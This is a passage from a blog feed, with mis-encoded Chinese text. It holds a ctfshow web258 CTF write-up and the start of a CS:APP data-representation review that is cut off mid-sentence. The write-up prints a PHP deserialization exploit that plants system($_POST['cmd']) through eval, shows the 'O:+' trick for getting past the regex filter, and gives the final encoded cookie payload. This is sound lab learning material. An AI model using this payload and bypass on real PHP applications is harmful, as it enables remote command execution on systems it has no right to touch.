        <content type="html"><![CDATA[<p>ctfshowçš„åˆ·é¢˜è®°å½•-web258</p><span id="more"></span><p>ååºåˆ—åŒ–å¯»æ€ç€å¤šåšç‚¹å§ï¼Œååºåˆ—åŒ–ä¸»è¦å°±æ˜¯å†™pocï¼Œå»æ„é€ ç¬¦åˆè¦æ±‚çš„å¯¹è±¡ã€‚</p><h2 id="åˆ†ææºç "><a href="#åˆ†ææºç " class="headerlink" title="åˆ†ææºç "></a>åˆ†ææºç </h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class=<span class="keyword">new</span> info();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="keyword">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class-&gt;getInfo();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$user</span> = unserialize(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$user</span>-&gt;login(<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>é€šè¿‡è¯»æºç å¯ä»¥å‘ç°æœ‰ä¸€ä¸ª <code>backDoor</code> ç±»ï¼Œå®ƒèƒ½è®©æˆ‘ä»¬ä½¿ç”¨ <code>eval</code> è¿›è¡Œå‘½ä»¤æ‰§è¡Œã€‚é‡‡ç”¨cookieä¼ å…¥pocååºåˆ—åŒ–ï¼Œæˆ‘ä»¬è®© <code>ctfShowUser</code> è¿™ä¸ª <code>class</code> å±æ€§ä¸º <code>backDoor</code> çš„ä¸€ä¸ªå¯¹è±¡ï¼Œå¹¶ä¸” <code>code</code> éœ€è¦æˆ‘ä»¬ä»»æ„å¯æ‰èƒ½è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œæ‰§è¡Œ <code>getinfo</code> å³å¯è§¦å‘ï¼Œåœ¨ <code>ctfShowUser</code> ç±»ä¸­çš„ææ„å‡½æ•°ä¼šè°ƒç”¨æ‰§è¡Œï¼Œäºæ˜¯æˆ‘ä»¬å†™å‡ºå¦‚ä¸‹ <code>poc</code>ã€‚</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class=<span class="keyword">new</span> backDoor();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="keyword">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class-&gt;getInfo();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>=<span class="string">&#x27;system($_POST[&quot;cmd&quot;]);&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//eval($this-&gt;code);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> ctfShowUser();</span><br><span class="line"><span class="variable">$res</span>=serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span>(urlencode(<span class="variable">$res</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å†™å‡ºpocä¹‹åè¿˜è¦æ³¨æ„ï¼Œè¿™é‡Œçš„ <code>poc</code> ä¸èƒ½æœ‰ç±»ä¼¼ <code>O:æ•°å­—</code> æˆ–è€…æ˜¯ <code>C:æ•°å­—</code> çš„å½¢å¼ï¼Œå¹¶ä¸”æ— è§†å¤§å°å†™ï¼Œé‚£ä¹ˆæˆ‘ä»¬éœ€è¦ç»•è¿‡ï¼Œé€šè¿‡åœ¨å†’å·åé¢åŠ ä¸Šä¸€ä¸ª <code>+</code> å³å¯ç»•è¿‡ï¼Œæˆ‘ä»¬åœ¨ååºåˆ—åŒ–å¯¹è±¡æ—¶ï¼Œå¯ä»¥åŠ ä¸€ä¸ªå­—ç¬¦ä¸²æ›¿æ¢ï¼Œå°† <code>O:</code> æ›¿æ¢ä¸º <code>O:+</code>ï¼Œ <code>C:</code> æ›¿æ¢æˆ <code>C:+</code>ï¼Œæ‰€ä»¥æˆ‘ä»¬æœ€ç»ˆ <code>poc</code> ä¸º</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class=<span class="keyword">new</span> backDoor();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="keyword">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class-&gt;getInfo();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>=<span class="string">&#x27;system($_POST[&quot;cmd&quot;]);&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//eval($this-&gt;code);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> ctfShowUser();</span><br><span class="line"><span class="variable">$res</span>=serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$res</span>=str_replace(<span class="string">&#x27;O:&#x27;</span>,<span class="string">&#x27;O:+&#x27;</span>,<span class="variable">$res</span>);</span><br><span class="line"><span class="variable">$res</span>=str_replace(<span class="string">&#x27;C:&#x27;</span>,<span class="string">&#x27;C:+&#x27;</span>,<span class="variable">$res</span>);</span><br><span class="line"><span class="keyword">echo</span>(urlencode(<span class="variable">$res</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç»“æœï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A%2B11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A0%3Bs%3A5%3A%22class%22%3BO%3A%2B8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A22%3A%22system%28%24_POST%5B%22cmd%22%5D%29%3B%22%3B%7D%7D</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬åœ¨ <code>cookie</code> çš„ <code>user</code> å­—æ®µä¸­ä¼ å…¥ <code>poc</code>ï¼Œç„¶å <code>post</code> ç»™ä¸€ä¸ª <code>cmd</code> å‚æ•°ä½œä¸ºå‘½ä»¤æ‰§è¡Œã€‚</p><p><img src="/2022/06/16/ctfshow%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-web258/1.png" alt="1"></p><p>å‘ç° <code>flag.php</code>ï¼Œæˆ‘ä»¬ <code>cat /flag</code> å¹¶ä¸”æ‰“å¼€æºä»£ç å‘ç° <code>flag</code>ã€‚</p><p><img src="/2022/06/16/ctfshow%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-web258/2.png" alt="2"></p><p>è¿™é‡Œä¸»è¦è¿˜å¾—æ³¨æ„ <code>url</code> ç¼–ç ä¼ å…¥ï¼Œå› ä¸º <code>cookie</code> ä»¥ <code>;</code> ä½œä¸ºåˆ†å‰²ç¬¦å·ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> web </category>
          
          <category> unserialize </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CS:APPç¬¬äºŒç« å¤ä¹ </title>
      <link href="/2022/06/03/CSAPP_Datalab/"/>
      <url>/2022/06/03/CSAPP_Datalab/</url>
      
        <content type="html"><![CDATA[<p>ä¹‹å‰ <code>CS:APP</code> æ²¡æœ‰å¥½å¥½å­¦ï¼Œä»Šå¤©ä¸‹å®šå†³å¿ƒæ¥é‡æ–°çœ‹ä¸€éï¼Œå¹¶æŠŠå®éªŒå¥½å¥½åšä¸€éä»¥å·©å›ºè‡ªèº«ã€‚</p><span id="more"></span><h2 id="ä¿¡æ¯å­˜å‚¨"><a href="#ä¿¡æ¯å­˜å‚¨" class="headerlink" title="ä¿¡æ¯å­˜å‚¨"></a>ä¿¡æ¯å­˜å‚¨</h2><h3 id="æ•°å­—è¡¨ç¤º"><a href="#æ•°å­—è¡¨ç¤º" class="headerlink" title="æ•°å­—è¡¨ç¤º"></a>æ•°å­—è¡¨ç¤º</h3><p>äºŒè¿›åˆ¶ï¼šåŒºåˆ«äºæˆ‘ä»¬å¹³æ—¶è®¡æ•°ä½¿ç”¨çš„åè¿›åˆ¶ï¼ŒäºŒè¿›åˆ¶ä½¿ç”¨çš„æ˜¯é€¢äºŒè¿›ä¸€åŸåˆ™ï¼Œè€Œæˆ‘ä»¬çš„åè¿›åˆ¶åˆ™æ˜¯é€¢åè¿›ä¸€ï¼Œæ¯”å¦‚æˆ‘ä»¬åè¿›åˆ¶çš„ <code>9+1</code> ä¸­çš„ <code>9</code>ï¼Œç­”æ¡ˆåº”è¯¥æ˜¯åï¼Œä½†æ˜¯ååº”è¯¥è¿›ä¸€ï¼Œå› æ­¤å¾—å‡ºäº†æˆ‘ä»¬å¸¸è§„çš„ç­”æ¡ˆ <code>10</code>ã€‚åœ¨äºŒè¿›åˆ¶é‡Œé¢ï¼Œæ¯ä¸€ä½åªè¦å¤§äºç­‰äº <code>2</code> åˆ™éƒ½è¦å‘é«˜ä½è¿›ä¸€ã€‚ä¸ºäº†æ–¹ä¾¿è¡¨ç¤ºï¼Œè¿˜è¡ç”Ÿå‡ºäº†äºŒè¿›åˆ¶çš„å­ç±»ï¼Œæ¯”å¦‚å…«è¿›åˆ¶ï¼Œåå…­è¿›åˆ¶ç­‰ï¼Œä¸»è¦æ˜¯äºŒè¿›åˆ¶å‘è¿™R</p><p>äº›è¿›åˆ¶è½¬æ¢è¾ƒä¸ºå®¹æ˜“ï¼Œè€Œè®¡ç®—æœºå¹³æ—¶åˆéƒ½å¤„ç†äºŒè¿›åˆ¶æ•°æ®ï¼Œå› æ­¤å°±å‡ºç°äº†è¿™äº›å¸¸è§çš„è¿›åˆ¶è®¡æ•°ã€‚</p><h3 id="ä¿¡æ¯å­˜å‚¨-1"><a href="#ä¿¡æ¯å­˜å‚¨-1" class="headerlink" title="ä¿¡æ¯å­˜å‚¨"></a>ä¿¡æ¯å­˜å‚¨</h3><p>å¤§å¤šæ•°è®¡ç®—æœºä½¿ç”¨çš„éƒ½æ˜¯8ä½ï¼ˆåœ¨è®¡ç®—æœºä¸­ï¼Œé™¤ç‰¹æ®Šè¯´æ˜å¤–ï¼Œä¸€ä½å‡æŒ‡çš„æ˜¯äºŒè¿›åˆ¶çš„ä½ï¼‰çš„å—ï¼Œæˆ–è€…å«å­—èŠ‚ï¼Œå­—èŠ‚æ˜¯ä½œä¸ºè®¡ç®—æœºå¯å¯»å€çš„æœ€å°å•ä½ã€‚ä¸€èˆ¬æ¥è¯´æˆ‘ä»¬å¹¶ä¸ä¹ æƒ¯äºå°†ä¸€ä¸ªå­—èŠ‚å†™æˆå…«ä½äºŒè¿›åˆ¶çš„æ•°ï¼Œè€Œæ˜¯ä¼šå†™æˆä¸¤ä½åå…­è¿›åˆ¶çš„æ•°ã€‚åå…­è¿›åˆ¶ä¸äºŒè¿›åˆ¶ä¹‹é—´çš„è½¬æ¢ä¹Ÿä¼šååˆ†å®¹æ˜“ï¼Œä¸¾ä¸ªä¾‹å­ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x99-&gt;0b10011001</span><br><span class="line">0x88-&gt;0b10001000</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥å‘ç°æˆ‘ä»¬å¹¶ä¸ç”¨åƒåè¿›åˆ¶é‚£æ ·æƒå€¼ç›¸åŠ æˆ–è€…æ˜¯é™¤äºŒå–ä½™é‚£ä¹ˆéº»çƒ¦ï¼Œæˆ‘ä»¬æŠŠä¸€ä½åå…­è¿›åˆ¶è§†ä¸ºå››ä½äºŒè¿›åˆ¶å³å¯ï¼Œè¿™æ ·æˆ‘ä»¬åœ¨è½¬æ¢çš„æ—¶å€™å°±æ˜¯ç›´æ¥æ¯ä¸€ä½åˆ†åˆ«è½¬äº†ï¼Œå¯ä»¥çœ‹å‡ºååˆ†çš„æ–¹ä¾¿ã€‚</p><h4 id="å­—æ•°æ®å¤§å°"><a href="#å­—æ•°æ®å¤§å°" class="headerlink" title="å­—æ•°æ®å¤§å°"></a>å­—æ•°æ®å¤§å°</h4><p>æ¯å°è®¡ç®—æœºéƒ½æœ‰ä¸€ä¸ªå­—é•¿ï¼Œå­—é•¿ä¸ºè®¡ç®—æœº <code>CPU</code> ä¸€æ¬¡èƒ½å¤„ç†çš„æœ€å¤§æ•°æ®ï¼Œä¹Ÿæœ‰ä¸€ç§è¯´æ³•æ˜¯èƒ½è¡¨ç¤ºçš„æœ€å¤§å†…å­˜ã€‚å…¶å®æ„æ€æ˜¯å·®ä¸å¤šçš„ï¼Œæ¯”å¦‚æˆ‘ä»¬éƒ½çŸ¥é“ <code>32</code> ä½çš„è®¡ç®—æœºæœ€å¤šèƒ½è£… <code>4GB</code> çš„å†…å­˜ï¼Œå†å¤šå®ƒä¹Ÿæ˜¯åªèƒ½ä½¿ç”¨è¿™ä¹ˆå¤šçš„å†…å­˜ï¼Œé‚£æ˜¯å› ä¸º <code>CPU</code> è¦è®¿é—®å†…å­˜çš„æ—¶å€™ï¼Œä¹Ÿåªèƒ½ä½¿ç”¨ä¸€ä¸ª <code>32</code> ä½çš„æ•°æ®æ¥è¡¨ç¤ºåœ°å€ï¼Œ32ä½çš„æ•°èƒ½è¡¨ç¤ºçš„æ•°çš„ä¸ªæ•°ä¹Ÿå°±æ˜¯ <code>2^32</code> è¿™ä¹ˆå¤šï¼Œè€Œåœ°å€æŒ‡ç¤ºçš„å•ä½æ˜¯å­—èŠ‚ï¼Œæ‰€ä»¥æœ€å¤šå°±æ˜¯ <code>2^32</code> å­—èŠ‚ï¼Œé‚£å°±æ˜¯ç†ŸçŸ¥çš„ <code>4GB</code> äº†ã€‚</p><p><code>C</code> è¯­è¨€ä¸­  <code>sizeof()</code> ä¼šè¿”å›ä¸€ä¸ªå¯¹è±¡æ‰€å çš„å­—èŠ‚æ•°ï¼Œæˆ‘ä»¬å¯¹æ¯”è¾“å‡ºä¸‹ <code>32</code> ä½æœºå­å’Œ <code>64</code> ä½æœºå­çš„å„ä¸ªåŸºæœ¬æ•°æ®ç±»å‹æ‰€å çš„å­—èŠ‚æ•°ã€‚æˆ‘ä»¬ä¸å¿…æ‰¾ä¸¤ä¸ªæœºå­ï¼Œåªéœ€è¦åœ¨ <code>64</code> ä½çš„æœºå­ä¸Šåˆ†åˆ«ç¼–è¯‘ <code>32</code> ä½å’Œ <code>64</code> ä½çš„ç¨‹åºå³å¯ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;char:%d\n&quot;</span>,<span class="keyword">sizeof</span>(<span class="keyword">char</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;short:%d\n&quot;</span>,<span class="keyword">sizeof</span>(<span class="keyword">short</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;int:%d\n&quot;</span>,<span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;long:%d\n&quot;</span>,<span class="keyword">sizeof</span>(<span class="keyword">long</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;char *:%d\n&quot;</span>,<span class="keyword">sizeof</span>(<span class="keyword">char</span> *));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;float:%d\n&quot;</span>,<span class="keyword">sizeof</span>(<span class="keyword">float</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;double:%d\n&quot;</span>,<span class="keyword">sizeof</span>(<span class="keyword">double</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>32 </code>ä½çš„ç»“æœï¼š</p><p><img src="/2022/06/03/CSAPP_Datalab/1.png" alt="1"></p><p><code>64</code> ä½çš„ç»“æœï¼š</p><p><img src="/2022/06/03/CSAPP_Datalab/2.png" alt="2">    </p><p>æˆ‘ä»¬æ€»ç»“å‡ºå¦‚ä¸‹è¡¨æ ¼</p><table><thead><tr><th>Cå£°æ˜</th><th>32ä½å­—èŠ‚æ•°</th><th>64ä½å­—èŠ‚æ•°</th></tr></thead><tbody><tr><td>char</td><td>1</td><td>1</td></tr><tr><td>short</td><td>2</td><td>2</td></tr><tr><td>int</td><td>4</td><td>4</td></tr><tr><td>long</td><td>4</td><td>4</td></tr><tr><td>char *</td><td>4</td><td>8</td></tr><tr><td>float</td><td>4</td><td>4</td></tr><tr><td>double</td><td>8</td><td>8</td></tr></tbody></table><p>å…¶å®æœ‰äº›æ—¶å€™ï¼Œ <code>long</code> çš„å­—èŠ‚æ•°ä¹Ÿä¼šéšæœºå™¨å­—é•¿æœ‰æ‰€å˜åŒ–çš„ï¼Œåªæ˜¯å¥½åƒæŸä¸ªç‰ˆæœ¬åŒºåˆ†äº† <code>64</code> ä½æ•´æ•°å°±å« <code>long long</code> è€Œ <code>long</code> åœ°ä½ä¸ <code>int</code> ä¸€è‡´äº†ã€‚ä½†æ˜¯é™¤äº†è¿™ä¸ªé—®é¢˜ï¼Œå¯ä»¥å‘ç°åªæœ‰æŒ‡é’ˆç±»å‹çš„æ•°æ®ä¼šéšç€æœºå™¨å­—é•¿å‘ç”Ÿå˜åŒ–ï¼Œè¿™ä¹Ÿå¦‚æˆ‘ä»¬æ‰€è¯´ï¼Œæœºå™¨å­—é•¿å†³å®šäº†æŒ‡é’ˆå°±å¤šå°‘ä½ï¼Œå†³å®šäº†æœ‰å¤šå°‘ä¸ªåœ°å€ï¼Œèƒ½ç”¨å¤šå°‘å†…å­˜ï¼Œå¤šå‡ºçš„å†…å­˜æœºå™¨å°±æ— æ³•åšåŒºåˆ†äº†ã€‚</p><h3 id="å¯»å€å’Œå­—èŠ‚é¡ºåº"><a href="#å¯»å€å’Œå­—èŠ‚é¡ºåº" class="headerlink" title="å¯»å€å’Œå­—èŠ‚é¡ºåº"></a>å¯»å€å’Œå­—èŠ‚é¡ºåº</h3><p>å¯¹äºå¤šå­—èŠ‚çš„æ•°æ®ç±»å‹æˆ‘ä»¬å¿…é¡»ç¡®å®šä¸¤ç‚¹ï¼š</p><ol><li>è¿™ä¸ªå¯¹è±¡åœ°å€åœ¨å“ªé‡Œ</li><li>è¿™ä¸ªå¯¹è±¡ä¸­çš„å­—èŠ‚æŒ‰ä»€ä¹ˆé¡ºåºæ’åˆ—</li></ol><p>æ¯”å¦‚ä¸€ä¸ª <code>int</code> å®ƒæœ‰å››ä¸ªå­—èŠ‚ï¼Œé‚£ä¹ˆæˆ‘å®šä¹‰ <code>int a=0x12345678</code>ã€‚é¦–å…ˆå®ƒä¸€å®šæ˜¯è¿ç»­æ’åˆ—çš„ï¼Œå› æ­¤æˆ‘ä»¬ç¡®å®šä¸€ä¸ª <code>int</code> 